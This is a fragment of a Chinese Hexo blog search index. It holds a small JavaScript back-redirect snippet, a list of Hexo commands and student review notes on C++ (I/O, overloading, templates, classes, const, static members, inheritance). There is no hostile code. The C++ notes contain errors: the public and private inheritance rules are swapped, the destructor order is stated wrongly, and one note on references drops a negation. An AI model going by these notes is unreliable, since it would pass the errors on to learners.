language=&quot;javascript&quot;&gt;setTimeout(&quot;window.history.go(-1)&quot;,3000)&lt;/script&gt;或者&lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;history.go(-1)&quot;,3000)&lt;/script&gt;]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo常用命令]]></title>
    <url>%2F2018%2F06%2F29%2FHexo%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[hexo s hexo shexo s 是 hexo serve 的缩写，用于本地预览： http://localhost:4000/ hexo clean 清除缓存文件 db.json 和已生成的静态文件 public网页异常清除缓存 hexo new hexo new 笔记名称新建一篇标题为“笔记名称”的文章 hexo d hexo dhexo d 是 hexo deploy 的缩写。用于自动生成静态文件，并部署到仓库。 hexo g hexo ghexo g 是 hexo generate 的缩写。用于生成网站静态文件到默认的 public 文件夹。 hexo new page hexo new page name新建一个标题为 name 的页面，默认链接地址为/name/页面不会出现在首页文章列表和归档中，也不支持分类和标签。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++复习！！！（课本：谭老爷爷版）]]></title>
    <url>%2F2018%2F06%2F24%2Fc%2B%2B%E5%A4%8D%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[一、从C到C++ C++如何实现I/O？它的优势在哪里？ 1、c++中I/O的概念 在c++中有一个stream，这个类，所有的I/O都以这个“流”为基础，包括我们认识的文件I/O。stream有两个重要的运算符: a、插入器（&lt;&lt;）：向流输入数据。 b、析取器（&gt;&gt;）：从流中读取数据。 2、与c语言相比之下的优势 1、最大的好处时完成了对流操作的封装。原来文件操作都是一个个分开的函数，现在的操作都是对象的方法。2、stream适用于设备输入和输出的。fstream是stream的派生类，即文件流（设备对象是文件），作为文件在c++中的一个抽象对象。 什么是重载函数？如何区分重载函数？ 1、什么是重载函数？ c++允许在同一作用域中用同意函数名来定义多个函数，这些函数的参数个数和参数类型不相同，这些同名的函数用来实现不同的功能，这就是函数的重载，即一个函数名多用。 2、区分函数重载 1、函数形参的个数； 2、函数形参的类型； 3、形参的顺序； 4、不能把返回值作为函数重载的条件，原因是编辑器在编译时不回去判断函数的返回类型，函数只有调用后，编译器才会去验证返回类型，所以返回值类型不能做为函数重载的依据； 5、常函数const可以作为函数重载的判断依据，原因：重载[]运算符时，有没有const的区别是：有const只读，没有const读写都可以。 什么是函数模板？为什么要使用函数模板？ 1、什么是函数模板？ 建立一个通用函数，其函数类型和形参不具体指定，用一个虚函数的类型来代表，这个通用的函数就称为函数模板。 例：max函数模板 template&lt;typename T&gt;T max(T a, T b, T c) {} 2、为什么要使用函数模板？ 简化对同名的知识形参类型不同的函数的定义。 使用带有默认参数的函数时，要注意些什么？ 1、如果函数的定义在函数调用之前，则应在函数定义中给出默认值。 2、一个函数不能既作为重载函数，又作为有默认参数的函数。 什么是变量的引用？要注意什么？ 在c++中，变量的“引用”就是变量的别名，因此，引用又称别名。建立“引用”的作用是为一个变量再起另一个名字，一边在需要时可以方便、间接地引用该变量。对一个变量的“引用”的所有的操作，实际上都是对其所代表的（原来的）变量的操作。 例：有一个变量a，想给他起一个别名b 12int a;int &amp;b = a; ATTENTION:由于引用不是独立的变量，编译系统给它单独分配储存单元，因此，在建立引用时只有声明没有定义，只是声明它和原有某一变量的关系。 为什么要使用inline函数？ 为了提高效率。 调用函数时需要一定的时间，如果有些函数需要频繁使用，则累计所用时间会很长，从而降低程序的执行效率。c++提供一种提高效率的方法，即在编译时，将所调用函数的代码嵌入到主调函数中。这种嵌入到主调函数中的函数称为内联函数。 作用域限定符“::”的作用是什么 在c++中，不同作用域内声明的变量可以同名，当局部变量和全局变量同名时，在局部变量中引用全局变量用到作用域限定符“::”。当全局变量和局部变量名字相同，重载时，就规定：用 “:: + 全局变量名” 来称呼全局变量。 二、类和对象 程序 = 对象 + 对象对象 = 算法 + 数据结构 什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？ 对象： 客观世界中任何一个事物都可以看成一个对象（object）。 类： 类是所有面向对象语言的共同特征，所有面向对象的语言都提供了这种类型。 抽象： 类是对象的抽象，而对象是类的具体实例。 数据抽象: 只向外界提供关键信息，并隐藏其后台的实现细节，即只表现必要的信息而不呈现细节。数据抽象是一种依赖于接口和实现分离的编程（设计）技术。 类的声明： 12345678class 类名 &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;; 类的定义： 12345678910111213141516171819202122232425//1、先声明，后定义：//(1)、class 类名 对象名1,对象名2,...;//(2)、类名 对象名1,对象名2,...;//2、声明同时定义：class 类名 &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;对象名1,对象名2,...;//3、不出现类名直接定义对象（非常 不建议 使用）：class &#123;private: 私有的数据和成员函数;public: 公用的数据和成员函数;protected: 受保护的数据和成员函数;&#125;对象名1,对象名2,...; c++中有哪些权限限定符？各起什么作用？ private private将成员声明为私有成员，只能被本类中的成员函数引用，类外不能调用（友元类除外）。 public public将成员声明为公有成员，既可以被本类成员函数所引用，也可以被类的作用域内的其他函数所引用。 protected protected将成员声明为受保护成员，不能被类外访问，但是可以被派生类的成员函数访问。 什么是类的封装？封装的原则是什么？ 1、什么是封装？ 封装可以隐藏实现细节，使代码模块化。封装是把过程和数据包围起来，对数据的访问只能通过已定义的界面。在面向对象编程上可理解为：把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。 2、封装的原则是什么？ 简化用户接口，隐藏实现细节，这个是封装的根本目的。封装的难点在于如何设计接口。其一：必须保证接口是功能的全集，即接口能够覆盖所有需求。不能完成必要功能的封装是没有意义的。其二：尽量使接口是最小冗余的。这是为了简化类使用者的学习和使用，难用的接口是最容易让人遗忘的。冗余接口的存在是被允许的，但必须保证冗余接口是有效的。也就是说，增加冗余接口会带来很大的好处，比如性能的飞升。其三：要保证接口是稳定的，将接口和实现分离，并将实现隐藏，就是为了能保护类使用者在类的实现细节改变的情况下，不必随时修改。一旦接口被公布，永远也不要改变它。 同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？ 是同一段代码。 通过this指针：每一个成员函数中都包括这个指针的名字是固定的，称为this。它是指向对象的指针，他的值是当前被调用的成员函数所在的对象的起始地址。例： 1234567int Box::volume()&#123; return (height * width * length);&#125;//C++把它处理为:int Box::volume(Box * this)&#123; return (this-&gt;height * this-&gt;width * this-&gt;length);&#125; 类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？ 区别1：静态成员函数实际上是一个全局函数,不依赖一个类的对象. 而属于类，不创建对象也可调用，静态成员函数没有this指针。普通成员函数依赖一个类的对象,也就是它有一个隐藏的调用参数（this）指针,必须指向一个类的对象。 区别2：静态函数只能访问类中的静态成员变量； 区别3：如果成员函数想作为回调函数来使用，如创建线程等，一般只能将它定义为静态成员函数才行。 三、类和对象的进一步讨论 构造函数、析构函数的英文单词是什么？ 构造函数——constructor 析构函数——destructor 构造函数的特点是什么？析构函数的特点是什么？ c++提供构造函数，来处理对象的初始化。构造函数是一种特殊的成员函数，与其他成员函数不同，不需要用户来调用它，而是在建立对象时自动执行。构造函数只是起初始化值的作用，但实例化一个对象的时候，可以通过实例去传递参数，从主函数传递到其他的函数里面，这样就使其他的函数里面有值了。规则，只要你一实例化对象，系统自动回调用一个构造函数，就算不写，编译器也自动调用一次。 析构函数与构造函数同名，但该函数前面加~。析构函数没有参数，也没有返回值，而且不能重载，在一个类中只能有一个析构函数。当撤销对象时，编译器也会自动调用析构函数。每一个类必须有一个析构函数，用户可以自定义析构函数，也可以是编译器自动生成默认的析构函数。一般析构函数定义为类的公有成员。 构造函数、析构函数的执行顺序是什么？ 先构造的先执行析构。 在C语言中，我们说main()函数是程序的入口，是最先被调用的函数，在C++中情况是这样吗？如果不是请说明原因，并举出实例。 c++中不是这样。 因为存在构造数据类型的定义对象定义，且对象为全局对象的话，则该类对象所属的构造类型的构造函数在main()函数之前执行。 const关键字const在c++中要尽可能的使用 table th:first-of-type { width:30%; } 形式 含义 Time const t1; t1是常对象，其值在任何情况下都不能改变 void Time::fun()const; fun是Time类中的成员函数，可以引用，但不能修改本类中的成员数据 Time * const p; p是指向time类对象的常指针变量，p的值（p的指向）不能改变 const Time * p; p是指向Time类常对象的指针变量，p指向的类对象的值不能通过p来改变 const Time &amp;t1 = t; t1是Time类对象t的引用，二者指向同一储存空间，t的值不能改变 const的作用是：数据的保护 常成员变量 类的常成员变量是用const关键字声明的成员变量，其值不可改变，它的初始值必须通过构造函数的初始化列表方式完成。一般将一个类中不可改变的值声明为常成员变量。但const成员变量有一个缺点：该类的所有对象都会const成员变量，而不是整个类共用一个。这种情况下，const常和static一起使用。 const成员函数 const成员函数语法为：int Obj::Func const;这表明成员函数Func const是个常成员函数，它的作用是表明只能引用类中的数据成员，而不能修改类中的数据成员。 常对象 语法为：const obj o(10); 或 obj const o(10);用const声明的对象为常对象，常对象必须初始化，如果一个对象被声明为const对象，则该对象的数据成员不可修改。即const对象不能调用该对象的非const成员函数。 指向const数据的指针 定义指针时，在指针的类型前面加上const表明该指针指向的对象是个常量。 const指针 在定义指针时，在指针的前面加上const表明该指针是一个常量，它必须被初始化。 const在参数中的使用 const在参数类型为指针或引用时经常被使用，这表明这个指针或引用所指向的数据不允许被修改，这样就保证了在被调函数中不能因为误操作而改变了主调函数中的值。 初始化列表的语法是怎样的？ 如下：1234567891011121314类名::构造函数名([参数表])[:成员初始化表]&#123;[构造函数体]&#125;//例：class Student&#123;public: Student(int n, char s, nam[]):num(n), sex(s)&#123; strcpy(name, nam); &#125;private: int num; char sex; int name[20];&#125;; 在C++中为什么使用new/delete，而不是malloc()/free()来来动态创建对象？如何使用new/delete来动态创建数组？ c语言中使用库函数malloc()和free()来动态申请和释放内存空间，但是存在两个问题：1、分配的大小需人为计算;2、只分配空间，而不涉及类型。c++使用了运算符new和delete来取代malloc()和free()函数。动态分配/释放内存。 例：动态创建一维数组123456789101112131415#include &lt;iostream&gt;using namespace std;int main()&#123; int n; cin &gt;&gt; n; //动态分配一维数组 int *arr = new int [n]; for(int i = 0; i &lt; n; i++) cin &gt;&gt; arr[i]; for(int i = 0; i &lt; n; i++) cout &lt;&lt; arr[i] &lt;&lt; " "; //释放arr数组 delete[] arr; return 0;&#125; 什么是对象的复制？什么是对象的赋值？ 对象的赋值 一般形式：对象名1 = 对象名2；对象的赋值只是用赋值号右边的对象的数据覆盖了赋值号左边的的对象的数据成员。因此必须使用有默认参数值的构造函数，以保证左值能被初始化。 对象的复制 一般形式：类名 对象2(对象1)； 或 `类名 对象2 = 对象1;例： 123456789101112131415161718class Student&#123;pubilc: Student ()&#123;m_strName="Jim";&#125; /* 默认的拷贝构造函数： Student (const Student &amp;stu)&#123;&#125; */ Student(const Student &amp;stu)&#123;m_strName = stu.m_strName;&#125; //显性定义的拷贝构造函数private: string m_strName;&#125;;int main()&#123; Student stu1; Student stu2 = stu1; Student stu3(stu1); return 0;&#125; 什么是深拷贝/浅拷贝？ 拷贝构造函数的语法如何？ 浅拷贝 对象拷贝时，仅仅是简单的值拷贝，这称为“浅拷贝”，这是系统默认的拷贝模式，不需要编程实现。 深拷贝 对象拷贝时，对堆中的数据编程进行拷贝，这称为“深拷贝”，这种拷贝模式需要编程实现。 拷贝构造函数 拷贝构造函数中只有哟个参数，为本类对象的一个引用，并通常使用const修饰。语法： 1234obj(const obj &amp;o)&#123; no = o.no; cout &lt;&lt; "copy constructor" &lt;&lt; no &lt;&lt; endl;&#125; static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？ static数据成员拥有一块单独的储存区（不再类对象内部），不管该类创造了多少个对象。所有该类的对象共享这块区域，这就为这些类之间提供了一种相互通信的方法，并且它不会占据对象的储存空间。他的名字是属于类的（例：Circle::PI），这样可以很大程度上解决全局数据的名字冲突问题。它是有权限控制的，也就是说他可以是private的。 除了数据成员能定义为static的，成员函数也可以定义为static的。与static数据成员一样，static成员函数也是属于类的，而不是属于对象的。static成员函数是属于类的，所以它没有this指针，不创建对象就可以被调用。它的这个特点决定了static成员函数只能访问类中的static数据成员和static成员函数。与类的static数据成员一样，推荐使用类方式引用类的static成员函数。 在类内提供的仅仅是static数据成员的声明（编译器没有给它分配空间），而不是定义，所以不能使用构造函数对其进行初始化，static数据成员的初始化必须在类外完成。static数据成员在使用时，既可以使用对象方式引用，也可以使用类方式引用，通常使用类方式引用，以表明它是一个static数据成员。 为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？ 友元机制可以带来一些便利。 友元可以实现在类的外部访问一个类的private成员 友元机制虽然可以带来一些便利，但是它严重破坏了程序的封装性，也有影响程序的可读性，所以要慎重使用友元。 四、运算符重载 在C++中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？ 五、继承和派生 继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？ 继承——inheritance。继承就是在已有类的基础上建立一个新类的过程。其中已经存在的类称为基类（base class），新建立的类称为派生类（derived class），从基类产生派生类的过程称为派生。 继承的语法： 1234class 派生类名: [继承方式] 基类名 &#123; //继承方式不写默认是private。 派生类新增加的成员&#125; 继承方式限定： private：基类的公有成员和保护成员在派生类中保持原有访问属性，其私有成员仍为基类私有。 public：积累的公有成员和保护成员在派生类中成了私有成员，其私有成员仍为基类私有。 protected：积累的公有成员和保护成员在派生类中成了保护成员，其私有成员仍为基类私有。 继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？ 继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。 派生类要无条件的接收基类中的全部成员。 派生类尽管拥有基类的所有的成员，但是派生类不能访问基类private的成员。 派生类从基类中继承的成员在不同的继承方式下的访问权限 组合（子对象）的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？ 子对象就是类对象中内嵌的对象。当派生类中存在子对象时，派生类的构造函数需要依次完成以下3部分：1、先调用基类构造函数初始化基类数据。2、再调用子对象的构造函数初始化子对象中的数据。3、最后初始化自己的数据成员。 当继承和组合都存在时，构造和析构的顺序如何？ 哪些地方必须使用初始化列表？ 什么是overriding、overload？什么是upcasting？ 多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？ 六、多态性和虚函数 什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？ 如何实现多态性？ 虚函数是如何实现的（考试不会考）？ 动态/静态绑定（binding、联编）的优缺点各是什么？ 什么是纯虚函数？什么是抽象类？其意义各自是什么？ 七、输入输出流 C++I/O的优势在哪（和前面第一章的类似）？ 标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？ 如何使用文件流进行输入/输出（步骤）？ 什么是字符串流？它有什么用好处？ 八、C++工具 实现异常的三个关键字是什么？大致的作用是什么？]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
</search>
